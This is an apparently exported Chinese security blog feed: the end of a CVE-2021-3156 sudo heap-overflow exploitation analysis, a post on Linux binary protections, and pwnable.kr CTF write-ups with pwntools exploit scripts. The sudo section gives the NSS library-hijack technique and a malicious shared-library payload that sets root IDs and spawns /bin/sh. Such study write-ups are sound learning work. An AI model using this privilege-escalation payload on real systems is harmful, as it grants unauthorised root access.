class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">	progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">	mode = MODE_EDIT;</span><br><span class="line">	sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    也就是说，加入我们执行<code>sudoedit -s</code>，就同时兼具了<code>MODE_SHELL|MODE_EDIT</code>而没有<code>MODE_RUN</code>，因此可以成功到达漏洞点。</p>
<p>一个溢出demo：</p>
<p><img src="https://i.loli.net/2021/04/10/w1pmGBidMAHYjhu.png" alt="溢出demo.png"></p>
<h5 id="1-堆溢出分析"><a href="#1-堆溢出分析" class="headerlink" title="1.堆溢出分析"></a>1.堆溢出分析</h5><p>1.堆在内存中的位置</p>
<p><img src="https://i.loli.net/2021/04/10/Q7CPNX43tiMVxWp.png" alt="堆的位置分布.png"></p>
<h5 id="2-堆的结构"><a href="#2-堆的结构" class="headerlink" title="2.堆的结构"></a>2.堆的结构</h5><p><img src="https://i.loli.net/2021/04/10/6938X7Ay4h2qOlR.png" alt="堆区结构.png"></p>
<p>arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类：</p>
<pre><code>main arena：主线程建立的arena；
thread arena：子线程建立的arena；
</code></pre>
<p>bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类:</p>
<pre><code>Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunk
Unsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。
Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。
Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。
</code></pre>
<p><img src="https://i.loli.net/2021/04/10/6XPgJO3GtnYodEf.png" alt="bins分类.png"></p>
<p><img src="https://i.loli.net/2021/04/10/oXgKMUD1Lc67Ybz.png" alt="fast_bin.png"></p>
<p><strong>PS:libc2.26 之后的 Tcache 机制</strong></p>
<p>Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。</p>
<p>区别：<strong>Max fast bins size is 0x80. Max tcache bins size is 0x410</strong></p>
<p><img src="https://i.loli.net/2021/04/10/heQiJqHdXUj9krF.png" alt="多线程共享堆区.png"></p>
<p>mutex：互斥锁，防止多线程对chunk资源的竞争</p>
<p><img src="https://i.loli.net/2021/04/10/odku3e8Mgavx4bB.png" alt="直观结构.png"></p>
<p>Large bin：</p>
<p><img src="https://i.loli.net/2021/04/10/eLkBGIz7Ah5E1gO.png" alt="largebin.png"></p>
<p>chunk：逻辑上划分的一小块内存，根据作用不同分为4类：</p>
<pre><code>Allocated chunk：即分配给用户且未释放的内存块；

Free chunk：即用户已经释放的内存块；

Top chunk：处于一个arena的最顶部的chunk

Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。
</code></pre>
<p>标志位：</p>
<p>A:记录当前chunk是否属于主线程</p>
<p>M:记录当前chunk是否是由mmap分配</p>
<p>P:记录前一个chunk块是否被分配</p>
<p><img src="https://i.loli.net/2021/04/10/VXnM5lwBWHrhxIe.png" alt="chunk结构.png"></p>
<p><strong>Malloc Algorithm：</strong></p>
<p><strong>1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。</strong></p>
<p>2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用</p>
<p>3.若fast bin中有合适大小的块，则先从中分配</p>
<p>TO  be continued….</p>
<p><strong>Free Algorithm：</strong></p>
<p><strong>1.若tcache bins有空间，则优先将空闲块放入其中</strong></p>
<p>2.如果块足够小，则优先放入fast bins中</p>
<p>TO  be continued….</p>
<p>从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>思路：利用溢出覆写<code>nss_library</code>为<code>X/X</code>，从而加载自定义的库函数，进而get root shell。</p>
<p>知识背景：</p>
<h5 id="1-glibc-setlocale"><a href="#1-glibc-setlocale" class="headerlink" title="1.glibc setlocale"></a>1.glibc setlocale</h5><p><strong>main()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/sudo.c</span></span><br><span class="line"><span class="number">150</span>:    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function">151:    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"><span class="number">171</span>:    setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line"><span class="number">216</span>:    sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/10/ZYQbr8e5tGUBqs9.png" alt="setlocale.png"></p>
<p><img src="https://i.loli.net/2021/04/10/5GCNfYP38zbSrFk.png" alt="setlocaleA.png"></p>
<p><strong>总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。</strong></p>
<h5 id="2-NSS（Name-Service-Switch）"><a href="#2-NSS（Name-Service-Switch）" class="headerlink" title="2.NSS（Name Service Switch）"></a>2.NSS（Name Service Switch）</h5><p>​    每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看<code>/etc/resolv.conf</code>配置文件的内容进行解析，对于用户和组来说，它会默认查看<code>/etc/passwd</code>和<code>/etc/group</code>。其配置文件位于<code>/etc/nsswitch.conf</code>，其每行都规定了查找方法的规范，在GNU C Library里, <strong>每个可用的SERVICE都必须有文件 <code>/lib/libnss_SERVICE.so.1</code> 与之对应。****</strong>也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。**</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. service_user 结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* Action according to result.  */</span></span><br><span class="line">lookup_actions actions[<span class="number">5</span>];</span><br><span class="line"><span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">service_library *library;</span><br><span class="line"><span class="comment">/* Collection of known functions.  */</span></span><br><span class="line"><span class="keyword">void</span> *known;</span><br><span class="line"><span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. nss_load_library() 函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nss_load_library</span> <span class="params">(service_user *ni)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">static</span> name_database default_table;</span><br><span class="line">   ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,   <span class="comment">// （1）设置 ni-&gt;library</span></span><br><span class="line">                  ni-&gt;name);</span><br><span class="line">   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">   <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">              + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   <span class="comment">// （2）伪造的库文件名必须是 libnss_xxx.so</span></span><br><span class="line">                          <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">                    ni-&gt;name),</span><br><span class="line">              <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">        __nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); <span class="comment">// （3）加载目标库</span></span><br><span class="line">      <span class="comment">//continue long long function</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>分析代码可知：如果溢出后可以覆盖<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.h#L61"><code>service_user</code>结构</a>。该结构出现在libc的<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.c#L320"><code>nss_load_library()</code>函数</a>中，用于加载动态链接库。如果能覆盖<code>service_user-&gt;name</code>，就能指定加载我们伪造的库，利用root权限运行非root权限的库。</p>
<p>我们要做的就是利用溢出部分将<strong>ni-&gt;library == null</strong>，所以找到距离我们占位块最近的一个service_user结构体即可。</p>
<p>gdb调试技巧： search -s <code>systemd</code> 和  search -s <code>mymachine</code> 定位出现的结构体，找到位置最合适的一个。</p>
<p>Demo:</p>
<p><img src="https://i.loli.net/2021/04/10/cLpqN4J7aKzWhrT.png" alt="寻找结构体.png"></p>
<p>最后一步：伪造<code>libnss_X/X.so.2</code>库</p>
<p>Demo:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __attribute__((constructor)) ___init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  seteuid(<span class="number">0</span>);</span><br><span class="line">  setegid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>加载该库函数即可get shell.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到<code>service_user</code>结构体上方为目标来进行，使得service结构体加载自定义库函数。</p>
<p>在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>堆溢出</tag>
        <tag>CVE-2021-3156</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序保护机制</title>
    <url>/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="Linux程序保护机制"><a href="#Linux程序保护机制" class="headerlink" title="Linux程序保护机制"></a>Linux程序保护机制</h1><p>​    在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:)</p>
<h2 id="Tools-checksec"><a href="#Tools-checksec" class="headerlink" title="Tools:checksec"></a>Tools:checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo:  题目:flag</p>
<p><img src="https://i.loli.net/2021/04/18/kOGJRsePqZuj2AM.png" alt="图片.png"></p>
<p>下面对逐个介绍保护机制</p>
<h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>​    在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p>
<p>​    Function：</p>
<p>1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作<br>“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。</p>
<p>2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。</p>
<p>3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。</p>
<p>4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。</p>
<p>5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。</p>
<p><img src="https://i.loli.net/2021/04/18/InOpchLTMduiEj6.png" alt="6.png"></p>
<p><img src="https://i.loli.net/2021/04/18/oFnTNEWy9baQixr.png" alt="7.jpg"></p>
<h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p>
<p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p>
<p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度</p>
<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX:no-excute不可执行</p>
<p>基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p><img src="https://i.loli.net/2021/04/18/phJd1xmej7unXZE.png" alt="8.jpg"></p>
<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作</p>
<h2 id="内存地址随机化机制几种情况："><a href="#内存地址随机化机制几种情况：" class="headerlink" title="内存地址随机化机制几种情况："></a>内存地址随机化机制几种情况：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>



<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO:read only relocation </p>
<p>由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<p>作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>了解以上内存保护机制的信息会为我们pwn提供一些信息。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Pwn</tag>
        <tag>程序保护机制</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable_game题解_1</title>
    <url>/2021/04/20/Pwn_1/</url>
    <content><![CDATA[<h1 id="Pwnable-games"><a href="#Pwnable-games" class="headerlink" title="Pwnable_games"></a>Pwnable_games</h1><p>开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp</p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><strong>Tips:</strong></p>
<p><strong>main函数的三个参数</strong></p>
<p>int argc</p>
<p>int型变量，表示传递给main函数的参数数量。</p>
<p>char *argv</p>
<p>指针数组，每个指针指向各个具体的参数。</p>
<p>char*envp</p>
<p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p>
<p>Demo:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure>

<p>此时argc=1,表示只有一个参数输入</p>
<p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure>

<p>此时argc=2,有两个参数传入</p>
<p>argc[0]指向输入程序路径及名称 “./hello”</p>
<p>argv[1]指向para_1字符串</p>
<p><strong>Linux 文件IO部分理解</strong></p>
<p>所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行：</p>
<ul>
<li><p>打开文件  ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。</p>
</li>
<li><p><strong>文件描述符fd：</strong></p>
</li>
</ul>
<p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p>
<ul>
<li>Linux shell创建的每个进程开始时都有三个打开的文件：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stdin 标准输入的文件标识符为0     </span><br><span class="line"></span><br><span class="line">stdout 标准输出的文件标识符为1</span><br><span class="line"></span><br><span class="line">stderr 标准错误输出的文件标识符为2</span><br></pre></td></tr></table></figure>



<p><strong>Exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;fd&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;fd.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./fd&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">payload=<span class="string">&quot;LETMEWIN&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p><strong>Tips:</strong></p>
<p>跟哈希相关不大（×  可能是我没有get到出题人的意思</p>
<p>思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。</p>
<p>具体计算方法为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">(568134124 + 1) / 5 = 113626825 = 0x6C5CEC9</span><br><span class="line">0x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8</span><br></pre></td></tr></table></figure>

<p>那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure>

<p>这里采用小端存储方式。</p>
<p>小端存储：高字节保存在内存高地址，低字节保存在内存低地址中</p>
<p>这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入</p>
<p>下面两张图说明问题：（×其实还并不能说明问题</p>
<p><img src="https://i.loli.net/2021/04/15/tHDIdXazbU4pqE6.png" alt="store.jpg"></p>
<p><img src="https://i.loli.net/2021/04/15/pg2WPeRi8dcGoOB.png" alt="store2.jpg"></p>
<p>但是我们并不知道输入的命令行参数在内存存储的增长方向😀</p>
<p>各种Google均无果。。无奈下手动测试一下。</p>
<p>Test Code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[],<span class="keyword">char</span>* env[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]:%p\n&quot;</span>,i,argv[i]);</span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;stack:%p\n&quot;</span>,&amp;i);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;env:%p\n&quot;</span>,env[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>实践出真知: </p>
<p><img src="https://i.loli.net/2021/04/15/mrwnc4Plt2YR9Na.png" alt="testout.jpg"></p>
<p>输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。</p>
<p>那么就很容易明白为什么逆序输入int四个字节了。</p>
<p>以为0x6C5CEC9和0x6C5CEC8为例  我们传入命令行参数argv[1]对应的字节序列为</p>
<p>\xc9\xce\xc5\x06\x12\x34\x56\x78实际存储时如下方式存储如下：</p>
<p>高地址8                                      78<br>高地址7                                      56<br>高地址6                                      34<br>高地址5                                      12<br>高地址4                                      06<br>高地址3                                      c5<br>高地址2                                      ce<br>高地址1                                      c9</p>
<p>int型号指针ip指向高地址1    那么由于int型号为小端存储，四个字节依次读取</p>
<p>ip[i]=0x06C5CEC9  ip[2]=0x78563412</p>
<p>网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。</p>
<p><strong>以上内容原创。转载注明出处。</strong></p>
<p>PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现</p>
<p>Demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`python -c <span class="built_in">print</span> <span class="string">&#x27;\xAB\xCD&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p><strong>Exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span>+p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;col&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">sh = shell.run(<span class="string">&#x27;./col&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p><strong>Analyse:</strong></p>
<p>get简单的溢出</p>
<p>IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52</p>
<p><strong>Exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">0x8</span>)+p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><strong>Analyse:</strong></p>
<p>IDA静态分析发现里面内容少得可怜..很明显是加壳了</p>
<p>这里需要用到strings命令，一个技巧可以获得关键的信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings  -20 flag</span><br></pre></td></tr></table></figure>

<p>显示flag文件中至少包含20个字符的字符串，定位关键信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net</span><br></pre></td></tr></table></figure>

<p>Google后简单了解了一下upx ，是个压缩壳</p>
<p>upx -d 解压一下即可</p>
<p>然后字符搜索关键词字  :)    #注意此处需要转义字符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings flag |grep \:\)</span><br></pre></td></tr></table></figure>

<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p><strong>souce code:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> passcode1;</span><br><span class="line">        <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;<span class="comment">//这个条件一旦成立就可以pwn</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span 